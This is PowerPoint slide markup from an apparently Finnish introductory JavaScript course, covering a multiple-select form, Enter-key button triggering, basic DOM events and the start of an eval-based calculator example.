      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84995" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{373D55EB-43D0-42CB-AEAD-B2C0038BC038}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1340768"/>
            <a:ext cx="10972800" cy="5328592"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>showSelected</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event</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myHobbies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> =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hobbies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document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getElementById</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id_hobbies</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a:solidFill>
                  <a:srgbClr val="AF00DB"/>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let</a:t>
            </a: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hobby</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of</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hobbies</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options</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AF00DB"/>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hobby</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selected</a:t>
            </a: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myHobbies</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push</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">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hobby</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Your</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hobbies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>are</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>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myHobbies</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join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 "</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r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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preventDefault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      }</a:t>
            </a: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script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action</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method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get</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myform</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select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name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hobbies</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a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</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id_hobbies</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multiple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multiple</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size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"5"</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games</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games</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"music"</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music</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reading</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reading</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0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sports</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sports</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;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&lt;option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value</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"tv"</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TV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>select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&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a: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button</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>showSelected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;b&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Choose</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/b&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Valitse</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button</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>form</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49"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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AAE5C8FF-1278-46DD-AF99-DBBA46040B1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Enter Triggering a Button Press in a Text Field</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128003" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79A0B70E-E889-41BA-8CE8-CEB9758EF38A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5141168"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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form</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action</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onsubmit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event</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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preventDefault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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&lt;input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type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search</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id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id_search</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size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"40"</a:t>
            </a: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&lt;input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type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button</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id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id_button</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Search</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br</a:t>
            </a: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/&gt;&lt;output</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id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result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/output&gt;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form</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elem</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id_search</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elem</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addEventListener</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keyup</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event</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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event</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>keyCode</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13</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13 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>enter</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key</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id_button</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click</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id_button</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onclick</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id_search</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result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innerText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> += </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\n</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27820D6C-4DC7-491E-8CA6-0CE2CAD70970}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Basics of Events</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F61C743-E8CA-4010-AE76-7E02E2046EFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Some common events, which can be attached to any HTML element:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>onMouseOver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = mouse hovers over the element</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>onMouseOut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = mouse leaves the area of the element</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>onLoad</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> event can attached to &lt;body&gt; or &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;. It triggers when page or that image is loaded.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>onFocus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>onBlur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> can be attached to form input elements. The former is triggered when the element gains focus and the latter when the element loses focus.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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F73F7F43-E622-4836-9F43-DEDF9F2842A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>JavaScript Calculator</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89091" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D1F1B87-6524-40D1-AD60-92548C1B9635}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1285875"/>
            <a:ext cx="8229600" cy="5357813"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"</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"http://www.w3.org/TR/html4/loose.dtd"&gt;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&lt;html&gt;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&lt;head&gt;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&lt;title&gt;JavaScript Calculator&lt;/title&gt;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&lt;script type="text/javascript"&gt;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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function calc(form) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        try {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            form.result.value = eval(form.expr.value)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        } catch(e) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            alert(e); // handle errors</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
